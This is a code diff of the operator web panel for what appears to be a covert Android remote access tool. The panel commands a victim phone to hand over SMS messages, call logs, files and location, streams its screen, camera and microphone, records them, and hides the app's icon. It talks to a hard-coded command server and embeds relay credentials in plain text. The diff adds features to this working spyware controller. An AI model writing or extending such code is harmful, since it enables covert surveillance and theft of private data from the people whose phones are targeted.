@@ -458,640 +458,550 @@
 
 <!-- Leaflet -->
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script type="module">
-    // ---------- GLOBALS ----------
+<script>
+    // ─── Config ───────────────────────────────────────────────────────────────
     const WS_URL = "wss://mirror-view.onrender.com";
-    let ws = null;
-
-    // WebRTC peer connections
-    let screenPC = null;
-    let cameraPC = null;
-    let audioPC = null;
-
-    // UI state
-    let mapInstance = null;
-    let currentData = [];
-    let currentPage = 0;
-    let dataType = null;
-    let currentPath = "root";
-    let selectedFiles = [];
-    let screenActive = false;
-    let iconHidden = false;
-
-    // Live camera recording state
-    let mediaRecorder = null;
-    let recordedChunks = [];
-
-    // Track the last command sent to interpret raw responses
-    let pendingCommand = null;
-
-    const panel = document.getElementById('main-panel');
-    const statusEl = document.getElementById('status');
-
-    // ---------- ICE SERVERS ----------
     const ICE_SERVERS = [
         { urls: "stun:stun.relay.metered.ca:80" },
-        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
-        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
+        { urls: "turn:standard.relay.metered.ca:80",                username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:standard.relay.metered.ca:80?transport=tcp",  username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:standard.relay.metered.ca:443",               username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turns:standard.relay.metered.ca:443?transport=tcp",username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
 
-    // ---------- SIGNALING OVER WEBSOCKET ----------
+    // ─── State ────────────────────────────────────────────────────────────────
+    let ws = null;
+    let screenPC = null, cameraPC = null, audioPC = null;
+    let screenActive = false, iconHidden = false;
+    let mapInstance = null;
+    let currentData = [], currentPage = 0, dataType = null, currentPath = "root";
+    let selectedFiles = [];
+    let camMediaRecorder = null, camRecordedChunks = [];
+    let screenMediaRecorder = null, screenRecordedChunks = [];
+    let pendingCommand = null;
+    // Quality preset (width × height @ fps)
+    let screenQuality = { w: 1280, h: 720, fps: 15 };
+
+    const panel    = document.getElementById('main-panel');
+    const statusEl = document.getElementById('status');
+
+    // ─── Signaling ────────────────────────────────────────────────────────────
     function sendSignalingMessage(msg) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            console.error('WebSocket not open');
-            return;
-        }
-        const payload = {
-            type: 'SIGNALING',
-            data: msg
-        };
-        ws.send(JSON.stringify(payload));
-        console.log('📤 Signaling sent:', msg.type);
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
+        ws.send(JSON.stringify({ type: 'SIGNALING', data: msg }));
     }
 
-    // ---------- PEER CONNECTION CREATORS ----------
-    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
+    // ─── PeerConnection factory ───────────────────────────────────────────────
+    function createPeerConnection(streamType, useMic) {
         const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
 
-        // Add transceivers to receive media
         if (streamType === 'screen') {
             pc.addTransceiver('video', { direction: 'recvonly' });
         } else if (streamType === 'camera') {
             pc.addTransceiver('video', { direction: 'recvonly' });
-            if (useMic) {
-                pc.addTransceiver('audio', { direction: 'recvonly' });
-            }
+            if (useMic) pc.addTransceiver('audio', { direction: 'recvonly' });
         } else if (streamType === 'audio') {
             pc.addTransceiver('audio', { direction: 'recvonly' });
         }
 
-        pc.ontrack = onTrackCallback;
+        pc.ontrack = (e) => {
+            if (streamType === 'screen') {
+                const v = document.getElementById('screenVideo');
+                if (v) { v.srcObject = e.streams[0]; console.log('Screen track received'); }
+            } else if (streamType === 'camera') {
+                const v = document.getElementById('liveCamVideo');
+                if (v) { v.srcObject = e.streams[0]; console.log('Camera track received'); }
+            } else if (streamType === 'audio') {
+                const a = document.getElementById('liveAudio');
+                if (a) { a.srcObject = e.streams[0]; a.play().catch(()=>{}); console.log('Audio track received'); }
+            }
+        };
+
         pc.onicecandidate = (e) => {
             if (e.candidate) {
-                sendSignalingMessage({
-                    type: 'ICE_CANDIDATE',
-                    candidate: e.candidate,
-                    streamType: streamType
-                });
+                sendSignalingMessage({ type: 'ICE_CANDIDATE', candidate: e.candidate, streamType });
             }
         };
+
         pc.oniceconnectionstatechange = () => {
-            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
-            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
-                if (streamType === 'screen') {
-                    screenActive = false;
-                    document.getElementById('screenBtn').innerText = 'Start Screen';
-                }
+            console.log(streamType + ' ICE:', pc.iceConnectionState);
+            if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
+                if (streamType === 'screen') { screenActive = false; document.getElementById('screenBtn').innerText = 'Start Screen'; }
             }
-        };
-        pc.onconnectionstatechange = () => {
-            console.log(`${streamType} connection state:`, pc.connectionState);
         };
         return pc;
     }
 
-    // Helper to get the correct peer connection based on stream type
-    function getPCForType(type) {
-        if (type === 'screen') return screenPC;
-        if (type === 'camera') return cameraPC;
-        if (type === 'audio') return audioPC;
-        return null;
+    function getPCForType(t) {
+        return t === 'screen' ? screenPC : t === 'camera' ? cameraPC : t === 'audio' ? audioPC : null;
     }
 
-    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
+    // ─── Incoming signaling ───────────────────────────────────────────────────
     function handleSignalingMessage(msg) {
-        console.log('Received signaling:', msg);
+        const pc = getPCForType(msg.streamType);
         if (msg.type === 'ANSWER') {
-            const pc = getPCForType(msg.streamType);
-            if (pc) {
-                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
-                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
-            }
+            if (!pc) { console.warn('No PC for ANSWER', msg.streamType); return; }
+            pc.setRemoteDescription({ type: 'answer', sdp: msg.sdp }).catch(e => console.error('setRemoteDesc:', e));
         } else if (msg.type === 'ICE_CANDIDATE') {
-            const pc = getPCForType(msg.streamType);
-            if (pc && msg.candidate) {
-                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
-                console.log('ICE candidate added for', msg.streamType);
-            }
+            if (!pc || !msg.candidate) return;
+            pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('addIce:', e));
         }
     }
 
-    // ---------- SCREEN SHARE ----------
+    // ─── Screen Quality UI ────────────────────────────────────────────────────
+    // Rendered inline when screen share panel is shown; changes screenQuality before offer
+    const QUALITY_PRESETS = {
+        '360p':  { w: 640,  h: 360,  fps: 15 },
+        '720p':  { w: 1280, h: 720,  fps: 15 },
+        '1080p': { w: 1920, h: 1080, fps: 15 },
+    };
+
+    // ─── Screen Share ─────────────────────────────────────────────────────────
     async function toggleScreen() {
-        console.log('toggleScreen called, current screenActive:', screenActive);
         if (screenActive) {
-            // Stop screen share
-            if (screenPC) {
-                screenPC.close();
-                screenPC = null;
-            }
+            sendSignalingMessage({ type: 'STOP_SCREEN', streamType: 'screen' });
+            if (screenPC) { screenPC.close(); screenPC = null; }
+            stopScreenRecord();
             document.getElementById('screenBtn').innerText = 'Start Screen';
             screenActive = false;
             panel.innerHTML = 'Ready.';
-            sendSignalingMessage({ type: 'STOP_SCREEN' });
-        } else {
-            panel.innerHTML = '<h2>Starting screen share...</h2>';
-            screenPC = createPeerConnection('screen', (e) => {
-                panel.innerHTML = `
-                    <video autoplay playsinline style="width:100%; height:auto;"></video>
-                    <div class="live-controls">
-                        <button onclick="snapScreen()">📸 Snap Screen</button>
-                        <button class="stop" onclick="toggleScreen()">⏹ Stop Screen</button>
-                    </div>
-                `;
-                document.querySelector('video').srcObject = e.streams[0];
-                console.log('ontrack for screen', e.streams);
-            }, false);
+            return;
+        }
 
-            try {
-                const offer = await screenPC.createOffer();
-                await screenPC.setLocalDescription(offer);
-                sendSignalingMessage({
-                    type: 'OFFER',
-                    sdp: offer.sdp,
-                    streamType: 'screen'
-                });
-                document.getElementById('screenBtn').innerText = 'Stop Screen';
-                screenActive = true;
-            } catch (e) {
-                console.error('Screen share failed:', e);
-                showNotification('Failed: ' + e.message);
-                screenPC = null;
-                panel.innerHTML = 'Ready.';
-            }
+        panel.innerHTML = '<p>⏳ Starting screen share…</p>';
+        screenPC = createPeerConnection('screen', false);
+
+        try {
+            const offer = await screenPC.createOffer();
+            await screenPC.setLocalDescription(offer);
+            sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
+
+            screenActive = true;
+            document.getElementById('screenBtn').innerText = 'Stop Screen';
+
+            panel.innerHTML = `
+                <div style="margin-bottom:8px;display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
+                    <span style="font-size:13px;color:#7b8a9b;">Quality:</span>
+                    <select id="screenQualitySelect" onchange="changeScreenQuality(this.value)"
+                            style="padding:4px 8px;border-radius:6px;border:1px solid #d0d9e2;font-size:13px;">
+                        <option value="360p">360p (low bandwidth)</option>
+                        <option value="720p" selected>720p (recommended)</option>
+                        <option value="1080p">1080p (high quality)</option>
+                    </select>
+                    <button onclick="snapScreen()" style="width:auto;padding:6px 12px;border-radius:6px;background:#1976ff;color:white;border:none;cursor:pointer;">📸 Screenshot</button>
+                    <button id="screenRecordBtn" onclick="toggleScreenRecord()" style="width:auto;padding:6px 12px;border-radius:6px;background:#e53935;color:white;border:none;cursor:pointer;">⏺ Record</button>
+                    <button class="stop" onclick="toggleScreen()" style="width:auto;padding:6px 12px;border-radius:6px;background:#d32f2f;color:white;border:none;cursor:pointer;">⏹ Stop</button>
+                </div>
+                <video id="screenVideo" autoplay playsinline style="width:100%;max-height:72vh;border-radius:8px;background:#000;display:block;"></video>`;
+        } catch(e) {
+            console.error('Screen share failed:', e);
+            showNotification('Failed: ' + e.message);
+            screenPC = null; panel.innerHTML = 'Ready.';
         }
     }
 
-    // ---------- SNAP SCREEN ----------
+    function changeScreenQuality(preset) {
+        const q = QUALITY_PRESETS[preset];
+        if (!q || !screenPC) return;
+        screenQuality = q;
+        // Apply via SDP renegotiation parameters via RTCRtpSender
+        screenPC.getSenders().forEach(sender => {
+            if (sender.track && sender.track.kind === 'video') {
+                const params = sender.getParameters();
+                if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
+                params.encodings[0].maxBitrate = q.w >= 1920 ? 3000000 : q.w >= 1280 ? 1500000 : 500000;
+                params.encodings[0].scaleResolutionDownBy = q.w >= 1920 ? 1.0 : q.w >= 1280 ? 1.0 : 2.0;
+                sender.setParameters(params).catch(e => console.warn('setParameters:', e));
+            }
+        });
+        showNotification('Quality: ' + preset);
+    }
+
     function snapScreen() {
-        const video = document.querySelector('video');
-        if (!video || !video.videoWidth) {
-            alert('No active screen share or video not ready');
-            return;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            const url = URL.createObjectURL(blob);
+        const video = document.getElementById('screenVideo');
+        if (!video || !video.videoWidth) { alert('No active screen share'); return; }
+        const c = document.createElement('canvas');
+        c.width = video.videoWidth; c.height = video.videoHeight;
+        c.getContext('2d').drawImage(video, 0, 0);
+        c.toBlob(blob => {
             const a = document.createElement('a');
-            a.href = url;
-            a.download = `screen_${Date.now()}.png`;
-            a.click();
-            URL.revokeObjectURL(url);
+            a.href = URL.createObjectURL(blob); a.download = 'screen_' + Date.now() + '.png'; a.click();
         }, 'image/png');
     }
 
-    // ---------- LIVE CAMERA ----------
+    function toggleScreenRecord() {
+        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
+            stopScreenRecord();
+        } else {
+            startScreenRecord();
+        }
+    }
+
+    function startScreenRecord() {
+        const video = document.getElementById('screenVideo');
+        if (!video || !video.srcObject) { showNotification('No active screen stream'); return; }
+        screenRecordedChunks = [];
+        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
+        screenMediaRecorder = new MediaRecorder(video.srcObject, { mimeType });
+        screenMediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenRecordedChunks.push(e.data); };
+        screenMediaRecorder.onstop = () => {
+            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob); a.download = 'screen_rec_' + Date.now() + '.webm'; a.click();
+        };
+        screenMediaRecorder.start(1000);
+        const btn = document.getElementById('screenRecordBtn');
+        if (btn) { btn.innerText = '⏹ Stop Rec'; btn.style.background = '#555'; }
+        showNotification('Screen recording started');
+    }
+
+    function stopScreenRecord() {
+        if (screenMediaRecorder && screenMediaRecorder.state !== 'inactive') {
+            screenMediaRecorder.stop();
+            screenMediaRecorder = null;
+        }
+        const btn = document.getElementById('screenRecordBtn');
+        if (btn) { btn.innerText = '⏺ Record'; btn.style.background = '#e53935'; }
+    }
+
+    // ─── Live Camera ──────────────────────────────────────────────────────────
     async function startLiveStream() {
-        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
+        const camera  = document.querySelector('input[name="liveCameraSelect"]:checked').value;
         const useFlash = document.getElementById('liveFlashCheckbox').checked;
-        const useMic = document.getElementById('liveMicCheckbox').checked;
+        const useMic   = document.getElementById('liveMicCheckbox').checked;
 
         panel.innerHTML = `
-            <video id="liveCamVideo" autoplay playsinline></video>
+            <video id="liveCamVideo" autoplay playsinline
+                style="width:100%;max-height:70vh;border-radius:8px;background:#000;display:block;"></video>
             <div class="live-controls">
-                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
-                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
-                <button class="stop" onclick="stopLiveStream()">Stop</button>
-            </div>
-        `;
+                <button onclick="takeSnapshot()" id="snapshotBtn">📸 Snapshot</button>
+                <button onclick="toggleCamRecording()" id="camRecordBtn">⏺ Record</button>
+                <button class="stop" onclick="stopLiveStream()">⏹ Stop</button>
+            </div>`;
 
-        cameraPC = createPeerConnection('camera', (e) => {
-            const video = document.getElementById('liveCamVideo');
-            if (video) video.srcObject = e.streams[0];
-            console.log('ontrack for camera', e.streams);
-        }, useMic);
+        cameraPC = createPeerConnection('camera', useMic);
 
         try {
             const offer = await cameraPC.createOffer();
             await cameraPC.setLocalDescription(offer);
             sendSignalingMessage({
-                type: 'OFFER',
-                sdp: offer.sdp,
-                streamType: 'camera',
-                camera: camera,
-                flash: useFlash,
-                mic: useMic
+                type: 'OFFER', sdp: offer.sdp, streamType: 'camera',
+                camera, flash: useFlash, mic: useMic
             });
-        } catch (e) {
-            console.error('Live camera start failed:', e);
-            showNotification('Failed to start camera stream');
-            cameraPC = null;
-            panel.innerHTML = 'Ready.';
+        } catch(e) {
+            console.error('Camera stream failed:', e);
+            showNotification('Failed: ' + e.message);
+            cameraPC = null; panel.innerHTML = 'Ready.';
         }
     }
 
-function stopLiveStream() {
-    if (cameraPC) {
-        cameraPC.close();
-        cameraPC = null;
+    function stopLiveStream() {
+        sendSignalingMessage({ type: 'STOP_CAMERA', streamType: 'camera' });
+        if (cameraPC) { cameraPC.close(); cameraPC = null; }
+        stopCamRecording();
+        panel.innerHTML = 'Ready.';
     }
-    sendSignalingMessage({ type: 'STOP_CAMERA' });
-    panel.innerHTML = 'Ready.';
-}
 
-    // ---------- LIVE AUDIO ----------
-    async function toggleLiveAudio() {
-        if (audioPC) {
-            stopLiveAudio();
+    function takeSnapshot() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.videoWidth) { alert('Video not ready'); return; }
+        // Detect if stream is rotated (portrait stream from phone)
+        const rotated = video.videoWidth < video.videoHeight;
+        const c = document.createElement('canvas');
+        if (rotated) { c.width = video.videoHeight; c.height = video.videoWidth; }
+        else          { c.width = video.videoWidth;  c.height = video.videoHeight; }
+        const ctx = c.getContext('2d');
+        if (rotated) {
+            ctx.translate(c.width / 2, c.height / 2);
+            ctx.rotate(Math.PI / 2);
+            ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2);
         } else {
-            startLiveAudio();
+            ctx.drawImage(video, 0, 0);
         }
+        c.toBlob(blob => {
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob); a.download = 'snapshot_' + Date.now() + '.png'; a.click();
+        }, 'image/png');
     }
+
+    function toggleCamRecording() {
+        if (camMediaRecorder && camMediaRecorder.state === 'recording') stopCamRecording();
+        else startCamRecording();
+    }
+
+    function startCamRecording() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.srcObject) { showNotification('No live stream'); return; }
+
+        // Correct rotation via canvas if the stream is portrait (W < H)
+        const needsRotation = video.videoWidth < video.videoHeight;
+        let recordStream = video.srcObject;
+
+        if (needsRotation) {
+            const canvas = document.createElement('canvas');
+            canvas.width  = video.videoHeight; // swap for landscape output
+            canvas.height = video.videoWidth;
+            const ctx = canvas.getContext('2d');
+            const draw = () => {
+                ctx.save();
+                ctx.translate(canvas.width / 2, canvas.height / 2);
+                ctx.rotate(Math.PI / 2); // 90° CW to correct portrait → landscape
+                ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2);
+                ctx.restore();
+                if (camMediaRecorder && camMediaRecorder.state === 'recording') requestAnimationFrame(draw);
+            };
+            recordStream = canvas.captureStream(30);
+            // Add audio tracks from original stream
+            video.srcObject.getAudioTracks().forEach(t => recordStream.addTrack(t));
+            camRecordedChunks = [];
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
+            camMediaRecorder = new MediaRecorder(recordStream, { mimeType });
+            camMediaRecorder.ondataavailable = e => { if (e.data.size > 0) camRecordedChunks.push(e.data); };
+            camMediaRecorder.onstop = () => {
+                const blob = new Blob(camRecordedChunks, { type: 'video/webm' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob); a.download = 'cam_rec_' + Date.now() + '.webm'; a.click();
+            };
+            camMediaRecorder.start(1000);
+            requestAnimationFrame(draw);
+        } else {
+            camRecordedChunks = [];
+            const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 'video/webm;codecs=vp9' : 'video/webm';
+            camMediaRecorder = new MediaRecorder(recordStream, { mimeType });
+            camMediaRecorder.ondataavailable = e => { if (e.data.size > 0) camRecordedChunks.push(e.data); };
+            camMediaRecorder.onstop = () => {
+                const blob = new Blob(camRecordedChunks, { type: 'video/webm' });
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(blob); a.download = 'cam_rec_' + Date.now() + '.webm'; a.click();
+            };
+            camMediaRecorder.start(1000);
+        }
+
+        const btn = document.getElementById('camRecordBtn');
+        if (btn) { btn.innerText = '⏹ Stop Rec'; }
+        showNotification('Camera recording started');
+    }
+
+    function stopCamRecording() {
+        if (camMediaRecorder && camMediaRecorder.state !== 'inactive') {
+            camMediaRecorder.stop();
+            camMediaRecorder = null;
+        }
+        const btn = document.getElementById('camRecordBtn');
+        if (btn) btn.innerText = '⏺ Record';
+    }
+
+    // ─── Live Audio ───────────────────────────────────────────────────────────
+    async function toggleLiveAudio() { if (audioPC) stopLiveAudio(); else await startLiveAudio(); }
 
     async function startLiveAudio() {
-        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
-        audioPC = createPeerConnection('audio', (e) => {
-            const audioEl = document.getElementById('liveAudio');
-            if (audioEl) {
-                audioEl.srcObject = e.streams[0];
-                audioEl.play().catch(err => console.log('Autoplay prevented:', err));
-            }
-            console.log('ontrack for audio', e.streams);
-        }, true);
+        panel.innerHTML = `<div style="text-align:center;padding:20px;">
+            <div style="font-size:48px;margin-bottom:16px;">🎤</div>
+            <div style="font-size:16px;color:#1a2634;margin-bottom:12px;">Live Audio Streaming</div>
+            <audio id="liveAudio" autoplay controls style="width:100%;margin-top:10px;"></audio>
+            <div style="margin-top:12px;font-size:12px;color:#7b8a9b;">Audio is streaming from the device's microphone</div>
+        </div>`;
+
+        audioPC = createPeerConnection('audio', false);
 
         try {
             const offer = await audioPC.createOffer();
             await audioPC.setLocalDescription(offer);
-            sendSignalingMessage({
-                type: 'OFFER',
-                sdp: offer.sdp,
-                streamType: 'audio',
-                mic: true
-            });
-            document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
+            sendSignalingMessage({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
+
+            document.getElementById('liveAudioBtn').innerText = 'Live Audio ▶';
             document.getElementById('stopLiveAudioBtn').style.display = 'block';
-        } catch (e) {
-            console.error('Live audio start failed:', e);
-            showNotification('Failed to start audio stream');
-            audioPC = null;
-            panel.innerHTML = 'Ready.';
+        } catch(e) {
+            console.error('Live audio failed:', e);
+            showNotification('Failed: ' + e.message);
+            audioPC = null; panel.innerHTML = 'Ready.';
         }
     }
 
     function stopLiveAudio() {
-        if (audioPC) {
-            audioPC.close();
-            audioPC = null;
-        }
-        sendSignalingMessage({ type: 'STOP_AUDIO' });
-        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
+        sendSignalingMessage({ type: 'STOP_AUDIO', streamType: 'audio' });
+        if (audioPC) { audioPC.close(); audioPC = null; }
+        document.getElementById('liveAudioBtn').innerText = 'Live Audio';
         document.getElementById('stopLiveAudioBtn').style.display = 'none';
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- COMMAND SENDING (JSON) ----------
-    function sendCommand(command, params = {}) {
+    // ─── Commands ─────────────────────────────────────────────────────────────
+    function sendCommand(command, params) {
+        params = params || {};
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
-            return;
+            panel.innerHTML = '<div style="color:#d32f2f;">⚠ Not connected.</div>'; return;
         }
-        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
-        const payload = {
-            type: 'COMMAND',
-            command: command,
-            requestId: requestId,
-            params: params,
-            timestamp: Date.now()
-        };
-        ws.send(JSON.stringify(payload));
-        panel.innerHTML = `📤 Command sent: ${command}`;
+        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2,5);
+        ws.send(JSON.stringify({ type: 'COMMAND', command, requestId, params, timestamp: Date.now() }));
+        panel.innerHTML = '📤 Sent: ' + command;
         pendingCommand = command;
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
     function sendPlainText(msg) {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
-            return;
-        }
+        if (!ws || ws.readyState !== WebSocket.OPEN) return;
         ws.send(msg);
-        panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
-    // ---------- PLAIN TEXT / JSON HANDLERS ----------
+    // ─── JSON message router ──────────────────────────────────────────────────
     function handleJSON(json) {
-        console.log('handleJSON:', json.type, json);
+        console.log('handleJSON:', json.type);
+        if (json.type === 'SIGNALING') { handleSignalingMessage(json.data); return; }
+
         switch (json.type) {
-            case 'SMS_DATA':
-                console.log('📩 SMS_DATA received', json.data);
-                dataType = 'sms';
-                currentData = json.data;
-                renderTable();
-                pendingCommand = null;
-                break;
-            case 'CALL_LOGS':
-                dataType = 'call';
-                currentData = json.data;
-                renderTable();
-                pendingCommand = null;
-                break;
-            case 'FILE_LIST':
+            case 'SMS_DATA': {
+                dataType = 'sms'; currentPage = 0;
+                // data may arrive as a JSON string (Android serializes it as string)
+                currentData = typeof json.data === 'string' ? safeParseArray(json.data) : (json.data || []);
+                renderTable(); pendingCommand = null; break;
+            }
+            case 'CALL_LOGS': {
+                dataType = 'call'; currentPage = 0;
+                currentData = typeof json.data === 'string' ? safeParseArray(json.data) : (json.data || []);
+                renderTable(); pendingCommand = null; break;
+            }
+            case 'FILE_LIST': {
                 dataType = 'file';
-                currentData = json.data;
-                renderFiles();
-                pendingCommand = null;
-                break;
-            case 'LOCATION_UPDATE':
-                renderMap(json.data);
-                pendingCommand = null;
-                break;
+                currentData = typeof json.data === 'string' ? safeParseArray(json.data) : (json.data || []);
+                renderFiles(); pendingCommand = null; break;
+            }
+            case 'LOCATION_UPDATE': {
+                const loc = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
+                renderMap(loc); pendingCommand = null; break;
+            }
             case 'CAMERA_IMAGE':
-                displayCapturedImage(json.data);
-                pendingCommand = null;
-                break;
-            case 'AUDIO_RECORDING':
-                showAudio(json.data);
-                pendingCommand = null;
-                break;
+                displayCapturedImage(json.data); pendingCommand = null; break;
+            case 'AUDIO_RECORDING': case 'AUDIO_DATA':
+                showAudio(json.data); pendingCommand = null; break;
             case 'ERROR':
-                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
-                pendingCommand = null;
-                break;
+                panel.innerHTML = '<div style="color:#d32f2f;">❌ ' + (json.error || json.message) + '</div>';
+                pendingCommand = null; break;
             case 'DEVICE_STATUS':
-                setStatus(json.status);
-                pendingCommand = null;
-                break;
+                setStatus(json.status); pendingCommand = null; break;
             case 'APP_HIDDEN':
-                iconHidden = true;
-                document.getElementById('iconBtn').innerText = 'Show Icon';
-                showNotification('App icon hidden');
-                pendingCommand = null;
-                break;
+                iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon';
+                showNotification('App hidden'); pendingCommand = null; break;
             case 'APP_SHOWN':
-                iconHidden = false;
-                document.getElementById('iconBtn').innerText = 'Hide Icon';
-                showNotification('App icon shown');
-                pendingCommand = null;
-                break;
+                iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon';
+                showNotification('App shown'); pendingCommand = null; break;
             case 'SCREEN_SHARE_STARTED':
-                screenActive = true;
-                document.getElementById('screenBtn').innerText = 'Stop Screen';
-                showNotification('Screen share started');
-                pendingCommand = null;
-                break;
+                screenActive = true; document.getElementById('screenBtn').innerText = 'Stop Screen'; break;
             case 'SCREEN_SHARE_STOPPED':
-                screenActive = false;
-                document.getElementById('screenBtn').innerText = 'Start Screen';
-                if (screenPC) { screenPC.close(); screenPC = null; }
-                showNotification('Screen share stopped');
-                pendingCommand = null;
-                break;
+                screenActive = false; document.getElementById('screenBtn').innerText = 'Start Screen';
+                if (screenPC) { screenPC.close(); screenPC = null; } break;
+            case 'HEARTBEAT': break;
             default:
-                console.log('Unhandled JSON type:', json.type);
-                // If we have a pending command, try to infer the response format
-                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
-                    dataType = 'file';
-                    currentData = json;
-                    renderFiles();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
-                    dataType = 'sms';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
-                    dataType = 'call';
-                    currentData = json;
-                    renderTable();
-                    pendingCommand = null;
-                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
-                    renderMap(json);
-                    pendingCommand = null;
+                // Fallback based on pending command
+                if (pendingCommand === 'GET_SMS' && (Array.isArray(json) || Array.isArray(json.data))) {
+                    dataType = 'sms'; currentData = Array.isArray(json) ? json : json.data; currentPage = 0; renderTable(); pendingCommand = null;
+                } else if (pendingCommand === 'GET_CALL_LOGS' && (Array.isArray(json) || Array.isArray(json.data))) {
+                    dataType = 'call'; currentData = Array.isArray(json) ? json : json.data; currentPage = 0; renderTable(); pendingCommand = null;
+                } else if (pendingCommand === 'LIST_FILES' && (Array.isArray(json) || Array.isArray(json.data))) {
+                    dataType = 'file'; currentData = Array.isArray(json) ? json : json.data; renderFiles(); pendingCommand = null;
+                } else if (json.lat && json.lon) {
+                    renderMap(json); pendingCommand = null;
                 }
-                break;
         }
+    }
+
+    function safeParseArray(str) {
+        try { const v = JSON.parse(str); return Array.isArray(v) ? v : []; }
+        catch(e) { console.error('parse fail', e); return []; }
     }
 
     function handlePlainText(msg) {
-        if (msg.startsWith("STATUS:")) {
-            setStatus(msg.substring(7));
-            pendingCommand = null;
-        } else if (msg.startsWith("LOC_DATA:")) {
-            try {
-                const data = JSON.parse(msg.substring(9));
-                renderMap(data);
-                pendingCommand = null;
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("FILE_LIST:")) {
-            try {
-                currentData = JSON.parse(msg.substring(10));
-                dataType = 'file';
-                renderFiles();
-                pendingCommand = null;
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("SMS_DATA:")) {
-            try {
-                currentData = JSON.parse(msg.substring(9));
-                dataType = 'sms';
-                renderTable();
-                pendingCommand = null;
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("CALL_DATA:")) {
-            try {
-                currentData = JSON.parse(msg.substring(10));
-                dataType = 'call';
-                renderTable();
-                pendingCommand = null;
-            } catch (err) { console.error(err); }
-        } else if (msg.startsWith("CAMERA_IMAGE:")) {
-            const base64 = msg.substring(13);
-            displayCapturedImage(base64);
-            pendingCommand = null;
-        } else if (msg.startsWith("AUDIO_RECORDING:")) {
-            showAudio(msg.substring(16));
-            pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
